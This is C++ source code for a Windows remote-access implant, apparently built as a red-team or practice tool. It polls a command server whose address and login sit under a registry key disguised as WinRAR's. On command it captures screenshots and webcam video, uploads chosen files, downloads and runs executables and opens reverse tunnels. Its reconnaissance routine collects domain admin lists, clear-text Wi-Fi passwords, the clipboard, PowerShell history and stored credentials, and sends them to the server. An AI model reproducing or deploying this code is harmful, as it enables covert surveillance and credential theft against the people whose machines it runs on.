#include <iostream>
#include <fstream>
#include <string>
#include <regex>
#include <chrono>
#include <ctime>
#include <cstdio>
#include <thread>
#include <filesystem>
#include <iostream>
#include <unordered_map>
#include <vector>
#include <curl/curl.h>
#include <wincrypt.h>
#include "zlib.h"
#include "ScreenCapture.h"
#include "FileUtils.h" 
#include "ctun.h"
#include "camera.h"
#include "reconwin.h"


struct CommandInfo {
    std::string command;
    std::string uuid;
    std::string extra;
};

std::string toHex(const std::string& input) {
    std::stringstream hexStream;
    hexStream << std::hex << std::setfill('0');
    for (unsigned char c : input) {
        hexStream << std::setw(2) << static_cast<unsigned int>(c);
    }
    return hexStream.str();
}

std::string GetRegistryValue(HKEY hKey, const std::string& subKey, const std::string& valueName) {
    HKEY hSubKey;
    if (RegOpenKeyExA(hKey, subKey.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
        DWORD dataSize = 0;
        if (RegQueryValueExA(hSubKey, valueName.c_str(), nullptr, nullptr, nullptr, &dataSize) == ERROR_SUCCESS) {
            std::vector<char> buffer(dataSize);
            if (RegQueryValueExA(hSubKey, valueName.c_str(), nullptr, nullptr, reinterpret_cast<LPBYTE>(buffer.data()), &dataSize) == ERROR_SUCCESS) {
                return std::string(buffer.data());
            }
        }
        RegCloseKey(hSubKey);
    }
    return ""; // Retourne une chaîne vide si la valeur n'a pas été trouvée ou s'il y a eu une erreur.
}

std::string getExecutablePath() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

std::string calculateSHA256Hash(const std::string& filePath) {
    std::string hashResult;
    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        DWORD bytesRead = 0;
        BYTE buffer[4096] = { 0 };
        DWORD dwDataLen = sizeof(buffer);
        DWORD dwHashLen = 0;
        DWORD cbHashSize = 0;
        DWORD cbBlockSize = 0;
        DWORD dwCount = 0;

        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_MACHINE_KEYSET);

        if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0) {
                CryptHashData(hHash, buffer, bytesRead, 0);
            }

            cbHashSize = sizeof(DWORD);
            if (CryptGetHashParam(hHash, HP_HASHSIZE, (BYTE*)&dwHashLen, &cbHashSize, 0)) {
                cbBlockSize = dwHashLen;
                hashResult.resize(cbBlockSize);
                CryptGetHashParam(hHash, HP_HASHVAL, (BYTE*)&hashResult[0], &dwHashLen, 0);
            }

            CryptDestroyHash(hHash);
        }

        CryptReleaseContext(hProv, 0);
        CloseHandle(hFile);
    }

    return hashResult;
}

std::string getCurrentDateTime() {
    auto now = std::chrono::system_clock::now();
    std::time_t now_time = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&now_time), "%Y%m%d%H%M%S");
    return ss.str();
}


size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t totalSize = size * nmemb;
    output->append(reinterpret_cast<const char*>(contents), totalSize);
    return totalSize;
}


std::string extractCsrfToken(const std::string& htmlContent) {
    std::regex regexPattern("<input type=\"hidden\" name=\"csrf_token\" value=\"([^\"]*)\">");
    std::smatch match;

    if (std::regex_search(htmlContent, match, regexPattern)) {
        return match[1].str();
    }

    return "";
}

CommandInfo extractCommandInfoFromJson(const std::string& jsonResponse) {
    CommandInfo commandInfo;

    std::regex commandRegex("\"command_executed\":\"([^\"]+)\"");
    std::regex uuidRegex("\"uuid\":\"([a-f0-9-]+)\"");
    std::regex extraRegex("\"extra\":\"([^\"]*)\"");

    std::smatch commandMatch;
    std::smatch uuidMatch;
    std::smatch extraMatch;

    if (std::regex_search(jsonResponse, commandMatch, commandRegex)) {
        commandInfo.command = commandMatch[1].str();
    }

    if (std::regex_search(jsonResponse, uuidMatch, uuidRegex)) {
        commandInfo.uuid = uuidMatch[1].str();
    }

    if (std::regex_search(jsonResponse, extraMatch, extraRegex)) {
        commandInfo.extra = extraMatch[1].str();
    }

    return commandInfo;
}

void performLogout(CURL* curl, const char* logoutUrl, const char* cookies) {
    curl_easy_reset(curl);
    curl_easy_setopt(curl, CURLOPT_URL, logoutUrl);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_REFERER, logoutUrl);
    curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies);
    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        std::cerr << "cURL Error (logout): " << curl_easy_strerror(res) << std::endl;
    } else {
        std::cout << "Logout successful!" << std::endl;
    }
}

void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUrl, const char* compressedArchivePath, const CommandInfo& commandInfo, const std::string& csrfToken) {
    // Reset cURL options
    curl_easy_reset(curl);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_URL, uploadUrl);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_REFERER, commandsUrl);

    // Set up the form data
    struct curl_httppost* post = nullptr;
    struct curl_httppost* last = nullptr;

    curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_FILE, compressedArchivePath, CURLFORM_END);
    curl_formadd(&post, &last, CURLFORM_COPYNAME, "command", CURLFORM_COPYCONTENTS, commandInfo.command.c_str(), CURLFORM_END);
    curl_formadd(&post, &last, CURLFORM_COPYNAME, "extra", CURLFORM_COPYCONTENTS, commandInfo.extra.c_str(), CURLFORM_END);
    curl_formadd(&post, &last, CURLFORM_COPYNAME, "uuid", CURLFORM_COPYCONTENTS, commandInfo.uuid.c_str(), CURLFORM_END);
    curl_formadd(&post, &last, CURLFORM_COPYNAME, "csrf_token", CURLFORM_COPYCONTENTS, csrfToken.c_str(), CURLFORM_END);

    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);

    // Perform the file upload
    CURLcode res = curl_easy_perform(curl);

    // Free the form data
    curl_formfree(post);

    if (res != CURLE_OK) {
        std::cerr << "cURL Error (file upload): " << curl_easy_strerror(res) << std::endl;
    } else {
        std::cout << "File uploaded successfully!" << std::endl;

        // Delete the compressed archive
        if (remove(compressedArchivePath) == 0) {
            std::cout << "Compressed archive deleted successfully!" << std::endl;
        } else {
            std::cerr << "Error deleting compressed archive!" << std::endl;
        }
    }
}

bool runInBackground(const char* executablePath) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcess(
        NULL,
        const_cast<char*>(executablePath),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true; 
    } else {       
        return false; 
    }
}

bool downloadFile(const std::string& url, const std::string& destinationPath) {
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        FILE* fp = fopen(destinationPath.c_str(), "wb");
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);

        if (res != CURLE_OK) {           
            return false;
        }
        return true;
    }
    return false;
}

std::unordered_map<std::string, std::string> executeAllCommands() {
    std::unordered_map<std::string, std::string> system_outputs;
  bool onDomain = isDomainJoined();
    if (onDomain) {
        executeCommand("echo %USERDOMAIN%", system_outputs["USERDOMAIN"]);
        executeCommand("echo %USERDNSDOMAIN%", system_outputs["USERDNSDOMAIN"]);
        executeCommand("echo %logonserver%", system_outputs["logonserver_echo"]);
        executeCommand("set logonserver", system_outputs["logonserver_set"]);
        executeCommand("set log", system_outputs["log_set"]);
        executeCommand("gpresult /V", system_outputs["gpresult_V"]);
        executeCommand("wmic ntdomain list /format:list", system_outputs["ntdomain_list"]);
    
    // Users
        executeCommand("dsquery user", system_outputs["dsquery_user"]);
        executeCommand("net user /domain", system_outputs["net_user_DOMAIN"]);
        executeCommand("net user <ACCOUNT_NAME> /domain", system_outputs["net_user_ACCOUNT"]);
        executeCommand("net accounts /domain", system_outputs["net_accounts"]);
        executeCommand("wmic useraccount list /format:list", system_outputs["useraccount_list"]);
        executeCommand("wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_user GET ds_samaccountname", system_outputs["ds_user_GET"]);
        executeCommand("wmic sysaccount list /format:list", system_outputs["sysaccount_list"]);
    
    // Groups
        executeCommand("net group /domain", system_outputs["net_group_DOMAIN"]);
        executeCommand("net localgroup administrators /domain", system_outputs["net_localgroup_admin"]);
        executeCommand("net group \"Domain Admins\" /domain", system_outputs["net_group_DomainAdmins"]);
        executeCommand("net group \"domain computers\" /domain", system_outputs["net_group_domain_computers"]);
        executeCommand("net group \"Domain Controllers\" /domain", system_outputs["net_group_DomainControllers"]);
        executeCommand("wmic group list /format:list", system_outputs["group_list"]);
        executeCommand("wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_group GET ds_samaccountname", system_outputs["ds_group_GET"]);
        executeCommand("wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_group where \"ds_samaccountname='Domain Admins'\" Get ds_member /Value", system_outputs["ds_group_members"]);
        executeCommand("wmic path win32_groupuser where (groupcomponent=\"win32_group.name=\\\"domain admins\\\",domain=\\\"DOMAIN_NAME\\\"\")", system_outputs["win32_groupuser"]);
    
    // Computers
        executeCommand("dsquery computer", system_outputs["dsquery_computer"]);
        executeCommand("net view /domain", system_outputs["net_view_domain"]);
        executeCommand("nltest /dclist:<DOMAIN>", system_outputs["nltest_dclist"]);
        executeCommand("wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_computer GET ds_samaccountname", system_outputs["ds_computer_GET"]);
        executeCommand("wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_computer GET ds_dnshostname", system_outputs["ds_computer_dnshostname"]);
    
    // Trust relations
        executeCommand("nltest /domain_trusts", system_outputs["nltest_domain_trusts"]);
    
    // Get all objects inside an OU
        executeCommand("dsquery * \"CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"", system_outputs["dsquery_ou"]);
    }

    if (isAdmin()) {
        executeCommand("netstat /anob", system_outputs["netstat_ADMIN"]);
        executeCommand("tasklist /V", system_outputs["tasklist_ADMIN"]);
        executeCommand("manage-bde -status", system_outputs["manage-bde"]);
        executeCommand("net session", system_outputs["net_session"]);
        executePowerShellCommand("auditpol /get /category:*", system_outputs, "security_event_audit_policy");
        executePowerShellCommand("Get-BitLockerVolume | Select-Object -Property VolumeStatus", system_outputs, "bitlocker_STATUS");
    }
    
    // Section "User":
    executePowerShellCommand("Get-Process | Select-Object ProcessName, SessionId, MainWindowTitle", system_outputs, "Get_session");
    executePowerShellCommand("Get-WmiObject Win32_LogonSession | Select-Object -Property StartTime, LogonType, AuthenticationPackage, @{Name='User';Expression={$_.GetRelated('Win32_LoggedOnUser').User.Name}}", system_outputs,   "logged_on_users");
    executePowerShellCommand("Get-Content (Get-PSReadLineOption).HistorySavePath", system_outputs, "powershell_HISTORY");
    executePowerShellCommand("Get-ClipBoard", system_outputs, "clipboard_GET");
    executeCommand("whoami /all", system_outputs["whoami_ALL"]);
    executeCommand("cmdkey.exe /list", system_outputs["cmdkey_ALL"]);
    executeCommand("dir /b c:\\users", system_outputs["user_directories"]);
    executePowerShellCommand("Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Format-Table", system_outputs, "active_network_TCP");
    executePowerShellCommand("Get-NetUDPEndpoint | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Format-Table", system_outputs, "active_network_UDP");
    executePowerShellCommand("netsh wlan show profiles | Select-String \":(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize", system_outputs, "WIFI_PASS");
    executePowerShellCommand("nslookup %LOGONSERVER%.%USERDNSDOMAIN%", system_outputs, "nslookup");

    // Section "Computer":
    executePowerShellCommand("Get-WmiObject Win32_Battery", system_outputs, "battery_REPORT");
    executePowerShellCommand("Get-WmiObject -Class SoftwareLicensingService", system_outputs, "windows_serials");
    executeCommand("wmic bios get Manufacturer, SMBIOSBIOSVersion, ReleaseDate", system_outputs["bios_info"]);
    executeCommand("wmic path win32_videocontroller get caption, name, videoarchitecture, AdapterRAM", system_outputs["graphics_card_info"]);
    executeCommand("wmic diskdrive get DeviceID, Model, InterfaceType, MediaType, Size", system_outputs["disk_info"]);
    executeCommand("wmic cpu get Name, MaxClockSpeed, NumberOfCores, NumberOfLogicalProcessors", system_outputs["cpu_info"]);
    executeCommand("wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\" | findstr /i /v \"\\\"\"", system_outputs["Unquoted Service Paths"]);
    executeCommand("wmic logicaldisk get caption, description, freespace, size, volumename", system_outputs["wmic_LOGICALDISK"]);
    executeCommand("wmic printer list full", system_outputs["wmic_list_PRINTER"]);
    executeCommand("wmic qfe list full /format:table", system_outputs["Installed_HOTFIX"]);
    executeCommand("wmic product get name, version", system_outputs["Installed_SOFTWARE"]);
    executePowerShellCommand("Get-ChildItem -Path C:\\ -Include *.xls -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Attributes -notmatch 'Directory' -and (Test-Path $_.FullName -PathType Leaf) } | Select-Object -Property Name, FullName", system_outputs, "excel_files");
    // Section "Browser":
    executePowerShellCommand("(Get-ChildItem \"$env:LOCALAPPDATA\" -Directory -Filter \"*chrome*\" -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName)", system_outputs, "chrome_profile_directories");
    executePowerShellCommand("(Get-ChildItem \"$env:LOCALAPPDATA\" -Directory -Filter \"*.default*\" -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName)", system_outputs, "firefox_profile_directories");
    executePowerShellCommand("(Get-ChildItem \"$env:LOCALAPPDATA\" -Directory -Filter \"*edge wallet*\" -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName)", system_outputs, "edge_profile_directories");

    // Section "System":
    executePowerShellCommand("Get-ChildItem Env:", system_outputs, "system_VARIABLES");
    executePowerShellCommand("Get-WinEvent -ListLog * | ForEach-Object { Get-WinEvent -LogName $_.LogName -FilterXPath '*[System[(Level=1 or Level=2)]]' -ErrorAction SilentlyContinue } | Format-Table -Property TimeCreated, Id, Message -Wrap -AutoSize", system_outputs, "event_error_critical_LOG");
    executePowerShellCommand("Get-CimInstance Win32_StartupCommand | Select-Object Caption, Command, Location, User", system_outputs, "startup_programs");
    executePowerShellCommand("(Get-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\").EnableLUA", system_outputs, "uac_STATUS");
    executePowerShellCommand("Get-ExecutionPolicy", system_outputs, "execution_policy");
    executePowerShellCommand("Get-MpComputerStatus", system_outputs, "defender_status");
    executePowerShellCommand("Get-MpPreference | Select-Object -Property *Protection", system_outputs, "malware_protection");
    executePowerShellCommand("Get-Content 'C:\\Windows\\System32\\drivers\\etc\\hosts'", system_outputs, "files_HOSTS");

    // Section "Firewall":
    executeCommand("netsh advfirewall show all", system_outputs["firewall_STATUS"]);
    executePowerShellCommand("Get-NetFirewallProfile | Select-Object -Property *", system_outputs, "firewall_PROFILS");
    executePowerShellCommand("Get-NetFirewallRule -Direction Inbound | Select-Object DisplayName, Action, Direction, Enabled | Format-Table -AutoSize", system_outputs, "firewall_RULES_INBOUND");
    executePowerShellCommand("Get-NetFirewallRule -Direction Outbound | Select-Object DisplayName, Action, Direction, Enabled | Format-Table -AutoSize", system_outputs, "firewall_RULES_OUTBOUND");
    
    // Section "Network":
    executeCommand("arp -a", system_outputs["arp"]);
    executeCommand("net start", system_outputs["net_START"]);
    executeCommand("net user", system_outputs["net_USER"]);
    executeCommand("ipconfig /displaydns", system_outputs["ipconfig_DNS"]);
    executeCommand("net localgroup", system_outputs["net_LOCALGROUP"]);
    executeCommand("net share", system_outputs["net_SHARE"]);   
    executeCommand("ipconfig /all", system_outputs["ipconfig_ALL"]);
    executePowerShellCommand("Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed, MediaType, DriverVersion, DriverDate, PhysicalMediaType, Virtual | Format-Table", system_outputs, "network_adapter_INFORMATION");
    executeCommand("route print", system_outputs["route_ROUTE-PRINT"]);
    executePowerShellCommand("Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\LSA", system_outputs, "credentials_guard_CHECK"); 
    executePowerShellCommand("Get-NetRoute", system_outputs, "route_GET-NETROUTE");

    // Section "Other":
    executeCommand("schtasks /query", system_outputs["schtasks"]);
    executeCommand("tasklist /v /fo TABLE", system_outputs["tasklist"]);
    executeCommand("driverquery", system_outputs["driversquery"]);
    executeCommand("driverquery /v /fo table | findstr /i \"Running\"", system_outputs["driversquery_RUNNING"]);
    executePowerShellCommand("Get-Service | Where-Object {$_.StartType -eq 'Automatic' -and $_.Status -ne 'Running'} | Select-Object -Property Name, DisplayName", system_outputs, "list_service_auto_NOT_RUNNING");
    executePowerShellCommand("Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate", system_outputs, "installed_software_POWERSHELL");
    executePowerShellCommand("Get-ChildItem 'C:\\Windows\\sysprep\\sysprep.xml', 'C:\\Windows\\sysprep\\sysprep.inf', 'C:\\Windows\\sysprep.inf', 'C:\\Windows\\Panther\\Unattended.xml', 'C:\\Windows\\Panther\\Unattend.xml', 'C:\\Windows\\Panther\\Unattend\\Unattend.xml', 'C:\\Windows\\Panther\\Unattend\\Unattended.xml', 'C:\\Windows\\System32\\Sysprep\\unattend.xml', 'C:\\Windows\\System32\\Sysprep\\unattended.xml', 'C:\\unattend.txt', 'C:\\unattend.inf' | Format-Table -Property Name, FullName", system_outputs, "sysprep_files");
    executeCommand(R"(dir C:\$Recycle.Bin /s /b)", system_outputs["recycle_BIN"]);
    executeCommand("dir /s /b %TEMP% & dir /s /b %windir%\Temp", system_outputs["tempory_files"]);
    executeCommand("dir /b c:\\users", system_outputs["user_directories"]);
    return system_outputs;
}

void writeHtmlFile(const std::unordered_map<std::string, std::string>& system_outputs) {
    std::string extension = ".xls";
    std::string directory = "C:\\temp";
    std::vector<std::string> files = searchFilesByExtension(directory, extension);

    std::ofstream html_file("system_info.html");
    if (html_file.is_open()) {
        writeHeader(html_file);

        std::vector<std::string> section_ids;
        for (const auto& entry : system_outputs) {
            std::string section_id = entry.first;
            section_ids.push_back(section_id);
            writeSectionLink(html_file, section_id, "**" + section_id + "**");
        }

        html_file << "<hr>\n"; 

        for (const auto& section_id : section_ids) {
            const std::string& content = system_outputs.at(section_id);
            writeSection(html_file, section_id, "Information " + section_id, content);
        }

        if (!files.empty()) {
            html_file << "<h2 id=\"found_files\">Found Files</h2>\n";
            html_file << "<ul>\n";
            for (const auto& file : files) {
                html_file << "<li>" << file << "</li>\n";
            }
            html_file << "</ul>\n";
        } else {
            html_file << "<p>No files found with extension " << extension << "</p>\n";
        }
        
        
                
        html_file.close();
        std::cout << "The file system_info.html has been successfully created." << std::endl;
    } else {
        std::cout << "Error opening HTML file." << std::endl;
    }
}


int main() {
    std::string user;
    std::string password;
    std::string secret;
    const std::string keyPath = "Software\\WinRAR\\hclient";
    std::string Username = GetRegistryValue(HKEY_CURRENT_USER, keyPath, "user");
    std::string Password = GetRegistryValue(HKEY_CURRENT_USER, keyPath, "password");
    std::string Secret = GetRegistryValue(HKEY_CURRENT_USER, keyPath, "secret");
    std::string URL = GetRegistryValue(HKEY_CURRENT_USER, keyPath, "url");   
    std::string loginUrl = std::string(URL) + "/login";
    std::string commandsUrl = std::string(URL) + "/get_commands";
    std::string uploadUrl = std::string(URL) + "/upload";
    std::string cookies;
    std::string executablePath = getExecutablePath();
    std::string hash = calculateSHA256Hash(executablePath);
    std::cout << "SHA-256 Hash of the executable: " << toHex(hash) << std::endl;
  
    std::cout << "User: " << Username << std::endl;
    std::cout << "Password: " << Password << std::endl;
    std::cout << "Secret: " << Secret << std::endl;
    std::cout << "URL: " << URL << std::endl;
    
    while (true) {
        CURL* curl = curl_easy_init();
        if (!curl) {
            std::cerr << "cURL initialization failed." << std::endl;
            std::this_thread::sleep_for(std::chrono::minutes(3));
            continue;
        }

        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "");
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
        
        std::string htmlContent;
        curl_easy_setopt(curl, CURLOPT_URL, loginUrl);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &htmlContent);
        CURLcode res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "cURL Error (CSRF token retrieval): " << curl_easy_strerror(res) << std::endl;
            curl_easy_cleanup(curl);
            std::this_thread::sleep_for(std::chrono::minutes(3));
            continue;
        }

        std::string csrfToken = extractCsrfToken(htmlContent);
        if (csrfToken.empty()) {
            std::cerr << "Unable to find CSRF token in HTML response." << std::endl;
            curl_easy_cleanup(curl);
            std::this_thread::sleep_for(std::chrono::minutes(3));
            continue;
        }

        std::cout << "CSRF Token: " << csrfToken << std::endl;
        curl_easy_reset(curl);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_URL, loginUrl);
        curl_easy_setopt(curl, CURLOPT_REFERER, loginUrl);
        std::string postFields = "username=" + Username + "&password=" + Password + "&secret=" + Secret + "&csrf_token=" + csrfToken;
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "cURL Error (login): " << curl_easy_strerror(res) << std::endl;
            curl_easy_cleanup(curl);
            std::this_thread::sleep_for(std::chrono::minutes(3));
            continue;
        }

        curl_easy_reset(curl);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_URL, commandsUrl);
        curl_easy_setopt(curl, CURLOPT_REFERER, loginUrl);
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
        htmlContent.clear();
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &htmlContent);
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "cURL Error (access to /get_commands): " << curl_easy_strerror(res) << std::endl;
        } else {
            std::cout << "Access to /get_commands successful!" << std::endl;
            std::cout << "Content of /get_commands page: " << std::endl;
            std::cout << htmlContent << std::endl;
        }

        CommandInfo commandInfo = extractCommandInfoFromJson(htmlContent);
        
        if (commandInfo.command == "get_screenshot") {
            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;

            ScreenCapture screenCapture;
            screenCapture.CaptureScreensAndSave();
            std::cout << "Screen capture completed!" << std::endl;

            const char* outputArchiveNamePattern = "*.bmp";
            std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePattern);

            deleteFiles("bmp"); 


            std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;
            
            performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken);


            
        } else if (commandInfo.command == "get_camera") {
            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;

            detectCameras();
            int cameraIndex = 1;  
            std::chrono::seconds duration(10);    

            recordVideo(cameraIndex, duration);
            const char* outputArchiveNamePattern = "*.avi";
            std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePattern);

            deleteFiles("avi"); //

            std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;

            performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken);

        
        } else if (commandInfo.command == "get_recon_info") {
            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;

            std::unordered_map<std::string, std::string> system_outputs = executeAllCommands();
            writeHtmlFile(system_outputs);
            const char* outputArchiveNamePattern = "*.html";
            std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePattern);

            deleteFiles("html"); //

            std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;

            performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken);


        } else if (commandInfo.command == "download_file") {
            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
            std::string downloadUrl = commandInfo.extra;
            std::string uuid = commandInfo.uuid;
            
            if (downloadUrl.empty()) {
                std::cerr << "Error: Empty download URL." << std::endl;
                return 1; 
            }
            std::string filename = std::filesystem::path(downloadUrl).filename().string();
            std::string destinationPath = "./" + filename;

            if (downloadFile(downloadUrl, destinationPath)) {
                std::cout << "File downloaded successfully to: " << destinationPath << std::endl;
            } else {
                std::cerr << "Error downloading file: " << curl_easy_strerror(res) << std::endl;  
            }

        } else if (commandInfo.command == "upload_file") {
            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
            std::string filePath = commandInfo.extra;
            std::string uuid = commandInfo.uuid;
            std::string compressedArchivePath;
            if (filePath.empty()) {
                std::cerr << "Error: Empty file path." << std::endl;
                return 1; 
            }

            std::string filename = std::filesystem::path(filePath).filename().string();          
            compressedArchivePath = compressFilesInCurrentDirectory(filename.c_str());
     
            if (std::filesystem::exists(compressedArchivePath)) {

                performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken);



            } else {

            }           
            
        } else if (commandInfo.command == "execute_exe") {
            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
            std::string executablePath;  
            std::string executableFilename = commandInfo.extra;

            if (executableFilename.empty()) { 
                std::cerr << "Error: Empty executable filename." << std::endl;
                return 1; 
            }
     
            if (executableFilename.find('/') == std::string::npos && executableFilename.find('\\') == std::string::npos) {
                executableFilename = "./" + executableFilename;
            }
      
            if (std::filesystem::exists(executableFilename)) {
            
                if (runInBackground(executableFilename.c_str())) {
                    std::cout << "Program " << executablePath << " executed in the background." << std::endl;
                } else {
                    std::cerr << "Error executing " << executablePath << " in the background. Error code: " << GetLastError() << std::endl;
                }
            } else {
                std::cerr << "Error: Executable file does not exist at path: " << executableFilename << std::endl;
            
            }
            
                       
        } else if (commandInfo.command == "rev_tun_port") {
            std::cout << "Executing reverse tunneling..." << std::endl;
            std::regex addressPortRegex("\\(\\s*([^:]+):(\\d+)\\s*\\)\\s*\\(\\s*([^:]+):(\\d+)\\s*\\)");
            

            std::smatch addressPortMatch;

            if (std::regex_search(commandInfo.extra, addressPortMatch, addressPortRegex)) {
                std::string adresseTunnel = addressPortMatch[1].str();
                int portTunnel = std::stoi(addressPortMatch[2].str());

                std::string adresseForward = addressPortMatch[3].str();
                int portForward = std::stoi(addressPortMatch[4].str());

                std::pair<std::string, int> tunnelAddress(adresseTunnel, portTunnel);
                std::pair<std::string, int> forwardAddress(adresseForward, portForward);

                TunnelingClient* tunnelingClient = new TunnelingClient(tunnelAddress, forwardAddress);
                tunnelingClient->startTunneling();
                
                tunnelingClient->closeTunnels();
                delete tunnelingClient;

                
            } else {
                std::cerr << "Invalid 'extra' format for reverse tunneling command." << std::endl;
            }

        } else {
            std::cerr << "Unable to initialize cURL." << std::endl;
        }

        curl_easy_cleanup(curl);
        std::this_thread::sleep_for(std::chrono::minutes(3));
    }

    return 0;
}
